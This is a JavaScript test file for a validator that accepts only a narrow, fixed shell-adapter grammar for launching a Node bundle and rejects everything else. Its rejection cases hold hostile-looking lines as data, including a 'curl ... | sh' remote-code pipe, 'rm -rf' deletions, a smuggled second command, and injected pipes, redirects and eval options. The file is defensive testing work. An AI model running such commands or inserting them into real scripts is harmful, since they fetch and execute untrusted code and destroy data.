import assert from "node:assert/strict";
import { describe, it } from "node:test";
import { inspectLegacyAdapter } from "./architecture-adapter.js";

const GOOD = [
  "#!/usr/bin/env bash",
  "set -euo pipefail",
  'ROOT="$(cd "$(dirname "$0")/.." && pwd)"',
  'NODE="$(command -v node)"',
  'BUNDLE="$ROOT/skills/foreman/runtime/dist/architecture-policy.js"',
  'exec "$NODE" "$BUNDLE" "$@"',
  "",
].join("\n");

describe("inspectLegacyAdapter", () => {
  it("accepts a thin shell adapter within the closed grammar", () => {
    assert.equal(inspectLegacyAdapter("scripts/run-policy.sh", GOOD), null);
  });

  it("rejects env-only exec without closed locator sequence", () => {
    const body = [
      "#!/bin/sh",
      'exec "$NODE" "$BUNDLE" "$@"',
      "",
    ].join("\n");
    assert.equal(
      inspectLegacyAdapter("scripts/env-only.sh", body),
      "legacy_adapter_domain_logic",
    );
  });

  it("rejects option-shaped Node entry arguments", () => {
    for (const second of [
      '"--eval=process.exit(1)"',
      '"-e"',
      '"--require=./x.js"',
      '"-r"',
      '"--print=1"',
      '"-p"',
    ]) {
      const body = [
        "#!/bin/sh",
        "set -euo pipefail",
        'ROOT="$(cd "$(dirname "$0")/.." && pwd)"',
        'NODE="$(command -v node)"',
        'BUNDLE="$ROOT/skills/foreman/runtime/dist/architecture-policy.js"',
        `exec node ${second} "$@"`,
        "",
      ].join("\n");
      assert.equal(
        inspectLegacyAdapter("scripts/opt.sh", body),
        "legacy_adapter_domain_logic",
        second,
      );
    }
    // Even with closed prefix, bare node + option fails
    const evalBody = [
      "#!/bin/sh",
      "set -euo pipefail",
      'ROOT="$(cd "$(dirname "$0")/.." && pwd)"',
      'NODE="$(command -v node)"',
      'BUNDLE="$ROOT/skills/foreman/runtime/dist/architecture-policy.js"',
      'exec node "--eval=process.exit(1)" "$@"',
      "",
    ].join("\n");
    assert.equal(
      inspectLegacyAdapter("scripts/eval.sh", evalBody),
      "legacy_adapter_domain_logic",
    );
  });

  it("rejects missing, duplicate, reordered, and inconsistent-name productions", () => {
    // missing root
    assert.equal(
      inspectLegacyAdapter(
        "scripts/miss-root.sh",
        [
          "#!/bin/sh",
          "set -euo pipefail",
          'NODE="$(command -v node)"',
          'BUNDLE="$ROOT/skills/foreman/runtime/dist/architecture-policy.js"',
          'exec "$NODE" "$BUNDLE" "$@"',
          "",
        ].join("\n"),
      ),
      "legacy_adapter_domain_logic",
    );
    // reordered: node before root
    assert.equal(
      inspectLegacyAdapter(
        "scripts/reorder.sh",
        [
          "#!/bin/sh",
          "set -euo pipefail",
          'NODE="$(command -v node)"',
          'ROOT="$(cd "$(dirname "$0")/.." && pwd)"',
          'BUNDLE="$ROOT/skills/foreman/runtime/dist/architecture-policy.js"',
          'exec "$NODE" "$BUNDLE" "$@"',
          "",
        ].join("\n"),
      ),
      "legacy_adapter_domain_logic",
    );
    // duplicate root
    assert.equal(
      inspectLegacyAdapter(
        "scripts/dup-root.sh",
        [
          "#!/bin/sh",
          "set -euo pipefail",
          'ROOT="$(cd "$(dirname "$0")/.." && pwd)"',
          'ROOT="$(cd "$(dirname "$0")/.." && pwd)"',
          'NODE="$(command -v node)"',
          'BUNDLE="$ROOT/skills/foreman/runtime/dist/architecture-policy.js"',
          'exec "$NODE" "$BUNDLE" "$@"',
          "",
        ].join("\n"),
      ),
      "legacy_adapter_domain_logic",
    );
    // bundle not rooted at declared ROOT
    assert.equal(
      inspectLegacyAdapter(
        "scripts/bad-root-ref.sh",
        [
          "#!/bin/sh",
          "set -euo pipefail",
          'ROOT="$(cd "$(dirname "$0")/.." && pwd)"',
          'NODE="$(command -v node)"',
          'BUNDLE="$OTHER/skills/foreman/runtime/dist/architecture-policy.js"',
          'exec "$NODE" "$BUNDLE" "$@"',
          "",
        ].join("\n"),
      ),
      "legacy_adapter_domain_logic",
    );
    // exec uses wrong variable names
    assert.equal(
      inspectLegacyAdapter(
        "scripts/wrong-exec-vars.sh",
        [
          "#!/bin/sh",
          "set -euo pipefail",
          'ROOT="$(cd "$(dirname "$0")/.." && pwd)"',
          'NODE="$(command -v node)"',
          'BUNDLE="$ROOT/skills/foreman/runtime/dist/architecture-policy.js"',
          'exec "$NODE_BIN" "$ENTRY" "$@"',
          "",
        ].join("\n"),
      ),
      "legacy_adapter_domain_logic",
    );
    // non-dist relative bundle
    assert.equal(
      inspectLegacyAdapter(
        "scripts/rel-bundle.sh",
        [
          "#!/bin/sh",
          "set -euo pipefail",
          'ROOT="$(cd "$(dirname "$0")/.." && pwd)"',
          'NODE="$(command -v node)"',
          'BUNDLE="$ROOT/out.js"',
          'exec "$NODE" "$BUNDLE" "$@"',
          "",
        ].join("\n"),
      ),
      "legacy_adapter_domain_logic",
    );
    // non-.js dist
    assert.equal(
      inspectLegacyAdapter(
        "scripts/nonjs.sh",
        [
          "#!/bin/sh",
          "set -euo pipefail",
          'ROOT="$(cd "$(dirname "$0")/.." && pwd)"',
          'NODE="$(command -v node)"',
          'BUNDLE="$ROOT/skills/foreman/runtime/dist/tool.sh"',
          'exec "$NODE" "$BUNDLE" "$@"',
          "",
        ].join("\n"),
      ),
      "legacy_adapter_domain_logic",
    );
  });

  it("rejects a modified legacy adapter with a domain branch", () => {
    const body = [
      "#!/usr/bin/env bash",
      "set -euo pipefail",
      'READY="$(jq -r .status < readiness.json)"',
      'if [ "$READY" = "not_ready" ]; then',
      "  remediate",
      "  exit 1",
      "fi",
      'exec node "$BUNDLE" "$@"',
      "",
    ].join("\n");
    assert.equal(
      inspectLegacyAdapter("skills/foreman/scripts/tool-check.sh", body),
      "legacy_adapter_domain_logic",
    );
  });

  it("rejects deletion before exec even when Node is invoked", () => {
    const body = [
      "#!/bin/sh",
      "rm -rf /tmp/owned",
      'exec node bundle.js "$@"',
      "",
    ].join("\n");
    assert.equal(
      inspectLegacyAdapter("scripts/bad-rm.sh", body),
      "legacy_adapter_domain_logic",
    );
  });

  it("rejects network pipe before node", () => {
    const body = [
      "#!/bin/sh",
      "curl https://example.com | sh",
      "node bundle.js",
      "",
    ].join("\n");
    assert.equal(
      inspectLegacyAdapter("scripts/bad-curl.sh", body),
      "legacy_adapter_domain_logic",
    );
  });

  it("rejects branch before node", () => {
    const body = [
      "#!/bin/sh",
      "if true; then echo allow; fi",
      "node bundle.js",
      "",
    ].join("\n");
    assert.equal(
      inspectLegacyAdapter("scripts/bad-if.sh", body),
      "legacy_adapter_domain_logic",
    );
  });

  it("rejects smuggled second command, pipe, redirect, and substitution on allowed lines", () => {
    assert.equal(
      inspectLegacyAdapter(
        "scripts/smuggle-semi.sh",
        [
          "#!/bin/sh",
          "set -euo pipefail",
          'ROOT="$(cd "$(dirname "$0")/.." && pwd)"',
          'NODE="$(command -v node)"',
          'BUNDLE="$ROOT/skills/foreman/runtime/dist/architecture-policy.js"',
          'exec "$NODE" "$BUNDLE" "$@"; rm -rf /tmp/x',
          "",
        ].join("\n"),
      ),
      "legacy_adapter_domain_logic",
    );
    assert.equal(
      inspectLegacyAdapter(
        "scripts/smuggle-pipe.sh",
        [
          "#!/bin/sh",
          "set -euo pipefail",
          'ROOT="$(cd "$(dirname "$0")/.." && pwd)"',
          'NODE="$(command -v node)"',
          'BUNDLE="$ROOT/skills/foreman/runtime/dist/architecture-policy.js"',
          'exec "$NODE" "$BUNDLE" "$@" | tee /tmp/out',
          "",
        ].join("\n"),
      ),
      "legacy_adapter_domain_logic",
    );
    assert.equal(
      inspectLegacyAdapter(
        "scripts/smuggle-redir.sh",
        [
          "#!/bin/sh",
          "set -euo pipefail",
          'ROOT="$(cd "$(dirname "$0")/.." && pwd)"',
          'NODE="$(command -v node)"',
          'BUNDLE="$ROOT/skills/foreman/runtime/dist/architecture-policy.js"',
          'exec "$NODE" "$BUNDLE" "$@" > /tmp/out',
          "",
        ].join("\n"),
      ),
      "legacy_adapter_domain_logic",
    );
    assert.equal(
      inspectLegacyAdapter(
        "scripts/smuggle-sub.sh",
        [
          "#!/bin/sh",
          "set -euo pipefail",
          'ROOT="$(cd "$(dirname "$0")/.." && pwd)"',
          'NODE="$(command -v node)"',
          'BUNDLE="$ROOT/skills/foreman/runtime/dist/architecture-policy.js"',
          'exec "$NODE" "$(echo evil)" "$@"',
          "",
        ].join("\n"),
      ),
      "legacy_adapter_domain_logic",
    );
    assert.equal(
      inspectLegacyAdapter(
        "scripts/smuggle-bg.sh",
        [
          "#!/bin/sh",
          "set -euo pipefail",
          'ROOT="$(cd "$(dirname "$0")/.." && pwd)"',
          'NODE="$(command -v node)"',
          'BUNDLE="$ROOT/skills/foreman/runtime/dist/architecture-policy.js"',
          'exec "$NODE" "$BUNDLE" "$@" &',
          "",
        ].join("\n"),
      ),
      "legacy_adapter_domain_logic",
    );
  });

  it("fails closed for non-POSIX legacy languages without a closed grammar", () => {
    assert.equal(
      inspectLegacyAdapter(
        "scripts/run.ps1",
        '& node $bundle @args\n',
      ),
      "legacy_adapter_domain_logic",
    );
    assert.equal(
      inspectLegacyAdapter(
        "scripts/run.py",
        "import subprocess, sys\nsubprocess.call([sys.executable, 'bundle.js'] + sys.argv[1:])\n",
      ),
      "legacy_adapter_domain_logic",
    );
  });
});
